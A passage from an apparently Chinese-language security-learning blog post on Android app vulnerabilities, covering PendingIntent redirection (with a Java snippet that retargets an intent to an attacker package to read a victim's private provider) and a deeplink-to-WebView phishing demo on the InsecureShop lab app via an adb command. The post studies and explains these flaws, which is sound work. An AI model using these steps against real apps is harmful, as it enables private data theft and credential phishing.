+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base.setData(Uri.parse(<span class="string">&quot;content://com.victim.private.provider/secret&quot;</span>));  <span class="comment">// 指向受害者私有 provider</span></span><br><span class="line">base.setPackage(<span class="string">&quot;com.attacker.evil&quot;</span>);                                     <span class="comment">// 目标改成自己</span></span><br><span class="line">base.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);  <span class="comment">// 获取临时权限</span></span><br></pre></td></tr></table></figure>
+<p>PendingIntent 的发送方是受害者 app，可以对攻击方 app 进行授权。攻击方拿到 read/write 权限，就可以读写受害者 app 未导出 Provider 的数据</p>
+<p>在安卓 12，为了修复这个漏洞，引入了 <code>FLAG_IMMUTABLE</code>  和 <code>FLAG_MUTABLE</code> 。如果 flags 设置为 <code>FLAG_IMMUTABLE</code> ，则这个 intent 不能被修改，自然也就不能匹配到攻击方应用了。</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpVeU56YzRNemszTVE9PSZhbXA7bWlkPTIyNDc0ODkyMjcmYW1wO2lkeD0xJmFtcDtzbj0xODczNDRlMjlmMTBjMjdiMTI3NzBkMjg3Yjk1OGYyNyZhbXA7Y2hrc209ZmE3YjE3ODdjZDBjOWU5MTMwNmI5ZDc0NTljMDllNzI2ODAxNWEwMmMzN2Q1NzZhZjJiOTA0OTU2ODkxZmZkZmE2MDI5MjkzZDM2NiZhbXA7c2NlbmU9MjEjd2VjaGF0X3JlZGlyZWN0">PendingIntent 重定向：一种针对安卓系统和流行 App 的通用提权方法 ——BlackHat EU 2021 议题详解（上）</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvaWZyRXJMODhfOHdOMzZXVDhRYkx2Zw==">https://mp.weixin.qq.com/s/ifrErL88_8wN36WT8QbLvg</span></p>
+<h2 id="deeplink"><a class="markdownIt-Anchor" href="#deeplink">#</a> deepLink</h2>
+<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpVeU56YzRNemszTVE9PSZhbXA7bWlkPTIyNDc0ODU1MDYmYW1wO2lkeD0xJmFtcDtzbj1iZmVkNTJhZGRkMWI2ZTQ4OTA3ZGZlN2I3NGM2N2Q3MiZhbXA7c2NlbmU9MjEmYW1wO3BvY190b2tlbj1IQURlb0dxajRxWG1ZNjFGa3NJVUFDY2pydlc4MzBRMjZyR1YtTlln">Android 中的特殊攻击面（二）—— 危险的 deeplink</span></p>
+<h3 id="通过deeplink操纵webview"><a class="markdownIt-Anchor" href="#通过deeplink操纵webview">#</a> 通过 deeplink 操纵 WebView</h3>
+<p>应用版本比较旧，如果没有明确写出 <code>exported=&quot;false&quot;</code>  则默认为 true</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908115022023.png" alt="image-20260908115022023"></p>
+<p>启用的两个比较危险的功能：允许执行 js 代码、允许对本地文件访问</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908114252787.png" alt="image-20260908114252787"></p>
+<p>并且接下来几乎没有校验</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908114635770.png" alt="image-20260908114635770"></p>
+<p>/webview 下对 uri 通过 endwith 进行白名单匹配，但是这样不起作用。匹配的应该是域名。详情可见：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvZW5kcG9pbnQvMjAxNDA3Lmh0bWw=">一文彻底搞懂安卓 WebView 白名单校验 - FreeBuf 网络安全行业门户</span></p>
+<p>接下来使用 adb 验证漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -a android.intent.action.VIEW -d &quot;insecureshop://com.insecureshop/web?url=http%3A%2F%2F172.20.10.4%3A8000%2F&quot;</span><br></pre></td></tr></table></figure>
+<p>本地写一个 html 文件，伪造成登录页面</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908115420523.png" alt="image-20260908115420523"></p>
+<p>将获取到的数据回传到服务端。</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908115551096.png" alt="image-20260908115551096"></p>
+<p>实现钓鱼网站攻击</p>
+
+      <div class="tags">
+          <a href="/tags/Mobile/" rel="tag"><i class="ic i-tag"></i> Mobile</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>Y&Y <i class="ic i-at"><em>@</em></i>保持好奇心
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2026/09/11/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E/" title="初识安卓漏洞">http://example.com/2026/09/11/安卓漏洞/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2026/08/03/%E6%9C%80%E6%96%B0%E4%BA%AC%E4%B8%9C%E5%8F%82%E6%95%B0%E5%88%86%E6%9E%90/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;68fe21983203f7be00a0b11a.png" title="最新京东参数分析">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> 实战</span>
+  <h3>最新京东参数分析</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#activity"><span class="toc-number">1.</span> <span class="toc-text"> Activity</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#intent-redirection"><span class="toc-number">1.1.</span> <span class="toc-text"> Intent Redirection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2024-26131"><span class="toc-number">1.1.1.</span> <span class="toc-text"> CVE-2024-26131</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.2.</span> <span class="toc-text"> 其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#contentprovider"><span class="toc-number">2.</span> <span class="toc-text"> ContentProvider</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#export"><span class="toc-number">2.1.</span> <span class="toc-text"> Export</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2025-21615"><span class="toc-number">2.1.1.</span> <span class="toc-text"> CVE-2025-21615</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#openfile"><span class="toc-number">2.2.</span> <span class="toc-text"> openFile</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#esc%E4%B8%AD%E7%9A%84openfile%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.1.</span> <span class="toc-text"> ESC 中的 openFile 漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#service"><span class="toc-number">3.</span> <span class="toc-text"> Service</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#implicit-export"><span class="toc-number">3.1.</span> <span class="toc-text"> Implicit Export</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intent%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">3.2.</span> <span class="toc-text"> Intent 重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96-2"><span class="toc-number">3.3.</span> <span class="toc-text"> 其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#broadcast-receivers"><span class="toc-number">4.</span> <span class="toc-text"> Broadcast Receivers</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#implicit-export-2"><span class="toc-number">4.1.</span> <span class="toc-text"> Implicit Export</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">4.2.</span> <span class="toc-text"> 信息泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pendingintent"><span class="toc-number">5.</span> <span class="toc-text"> PendingIntent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deeplink"><span class="toc-number">6.</span> <span class="toc-text"> deepLink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87deeplink%E6%93%8D%E7%BA%B5webview"><span class="toc-number">6.1.</span> <span class="toc-text"> 通过 deeplink 操纵 WebView</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2026/04/15/LLVM%20Pass%E7%BC%96%E5%86%99%E5%8F%8A%E5%8E%BB%E9%99%A4%20%E2%80%94%E2%80%94%20%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/" rel="bookmark" title="LLVM Pass编写及去除 —— 控制流平坦化">LLVM Pass编写及去除 —— 控制流平坦化</a></li><li><a href="/2026/04/28/LLVM%20Pass%E7%BC%96%E5%86%99%E5%8F%8A%E5%8E%BB%E9%99%A4%E2%80%94%E2%80%94%E8%99%9A%E5%81%87%E6%8E%A7%E5%88%B6%E6%B5%81/" rel="bookmark" title="LLVM Pass编写及去除——虚假控制流">LLVM Pass编写及去除——虚假控制流</a></li><li><a href="/2026/05/11/Android%E4%B8%80%E4%BA%8C%E4%B8%89%E4%BB%A3%E5%A3%B3%E5%AE%9E%E7%8E%B0/" rel="bookmark" title="Android一二三代壳实现">Android一二三代壳实现</a></li><li><a href="/2026/05/11/%E5%88%86%E6%9E%90%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AEDPT%E6%8A%BD%E5%8F%96%E5%A3%B3%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0/" rel="bookmark" title="分析开源项目DPT抽取壳源码实现">分析开源项目DPT抽取壳源码实现</a></li><li><a href="/2026/05/23/%E6%A2%86%E6%A2%86%E5%8A%A0%E5%9B%BA%E5%88%86%E6%9E%90/" rel="bookmark" title="梆梆加固分析">梆梆加固分析</a></li><li><a href="/2026/07/08/LLVM%20Pass%E7%BC%96%E5%86%99%E5%8F%8A%E5%8E%BB%E9%99%A4%20%E2%80%94%E2%80%94%20%E9%97%B4%E6%8E%A5%E8%B7%B3%E8%BD%AC/" rel="bookmark" title="LLVM Pass编写及去除 —— 间接跳转">LLVM Pass编写及去除 —— 间接跳转</a></li><li class="active"><a href="/2026/09/11/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="初识安卓漏洞">初识安卓漏洞</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="Y&Y"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">Y&Y</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">15</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">5</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">2</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NpbmdsZWhvcm4=" title="https:&#x2F;&#x2F;github.com&#x2F;singlehorn"><i class="ic i-github"></i></span>
+      <span class="exturl item about" data-url="aHR0cHM6Ly9hYm91dC5tZS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;about.me&#x2F;yourname"><i class="ic i-address-card"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>About</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>Posts</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>Archives</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>Categories</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>Tags</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/link/" rel="section"><i class="ic i-heart"></i>friends</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0/" title="In 学习">学习</a>
+</div>
+
+    <span><a href="/2026/04/15/LLVM%20Pass%E7%BC%96%E5%86%99%E5%8F%8A%E5%8E%BB%E9%99%A4%20%E2%80%94%E2%80%94%20%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/" title="LLVM Pass编写及去除 —— 控制流平坦化">LLVM Pass编写及去除 —— 控制流平坦化</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0/" title="In 学习">学习</a>
+</div>
+
+    <span><a href="/2026/05/23/%E6%A2%86%E6%A2%86%E5%8A%A0%E5%9B%BA%E5%88%86%E6%9E%90/" title="梆梆加固分析">梆梆加固分析</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/wp/" title="In wp">wp</a>
+</div>
+
+    <span><a href="/2025/11/03/2025N1CTF%20%E9%80%86%E5%90%91wp/" title="2025N1CTF 逆向wp">2025N1CTF 逆向wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%87%BA%E9%A2%98/" title="In 出题">出题</a>
+</div>
+
+    <span><a href="/2025/12/08/Mini%20vnctf%20%20%20Crackme%20Wirteup/" title="Mini vnctf  Crackme Wirteup">Mini vnctf  Crackme Wirteup</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0/" title="In 学习">学习</a>
+</div>
+
+    <span><a href="/2026/05/11/%E5%88%86%E6%9E%90%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AEDPT%E6%8A%BD%E5%8F%96%E5%A3%B3%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0/" title="分析开源项目DPT抽取壳源码实现">分析开源项目DPT抽取壳源码实现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%87%BA%E9%A2%98/" title="In 出题">出题</a>
+</div>
+
+    <span><a href="/2026/02/04/VNCTF2026%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" title="VNCTF2026出题笔记">VNCTF2026出题笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0/" title="In 学习">学习</a>
+</div>
+
+    <span><a href="/2026/07/08/LLVM%20Pass%E7%BC%96%E5%86%99%E5%8F%8A%E5%8E%BB%E9%99%A4%20%E2%80%94%E2%80%94%20%E9%97%B4%E6%8E%A5%E8%B7%B3%E8%BD%AC/" title="LLVM Pass编写及去除 —— 间接跳转">LLVM Pass编写及去除 —— 间接跳转</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0/" title="In 学习">学习</a>
+</div>
+
+    <span><a href="/2026/09/11/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E/" title="初识安卓漏洞">初识安卓漏洞</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0/" title="In 学习">学习</a>
+</div>
+
+    <span><a href="/2026/04/28/LLVM%20Pass%E7%BC%96%E5%86%99%E5%8F%8A%E5%8E%BB%E9%99%A4%E2%80%94%E2%80%94%E8%99%9A%E5%81%87%E6%8E%A7%E5%88%B6%E6%B5%81/" title="LLVM Pass编写及去除——虚假控制流">LLVM Pass编写及去除——虚假控制流</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AE%9E%E6%88%98/" title="In 实战">实战</a>
+</div>
+
+    <span><a href="/2026/07/17/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4%E5%AE%89%E5%8D%93%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%B7%B7%E6%B7%86/" title="实战去除安卓应用中的多种混淆">实战去除安卓应用中的多种混淆</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2025 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y&Y @ Y&Yのblog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2026/09/11/安卓漏洞/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
